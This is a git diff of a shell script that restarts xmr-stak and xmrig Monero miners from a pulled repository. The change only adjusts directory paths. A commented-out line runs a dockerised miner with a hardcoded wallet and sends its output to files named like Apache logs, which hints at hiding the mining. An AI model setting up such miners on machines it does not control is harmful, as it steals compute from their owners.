@@ -6,8 +6,8 @@ killall xmrig
 killall xmr-stak
 
 desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
-cd tanhuevon/ ; git stash drop; git reset --hard; git pull
-cd tanhuevon/ ; chmod +x xmr-stak; ./xmr-stak &> xmr-stak.log
+cd ~/tanhuevon/ ; git stash drop; git reset --hard; git pull
+cd ~/tanhuevon/ ; chmod +x xmr-stak; ./xmr-stak &> xmr-stak.log
 
 #apt -y install docker.io
 #docker run warlax/xmrig-cpu-cryptonightv7 -o pool.supportxmr.com:5555 -u 43P5Rt8Rnoi4RDvP4FWEWtLyJN9RV9MQJCohgmHgkLLHBJSoRo96SAvjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fXbps4 -p `cat index.html` --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
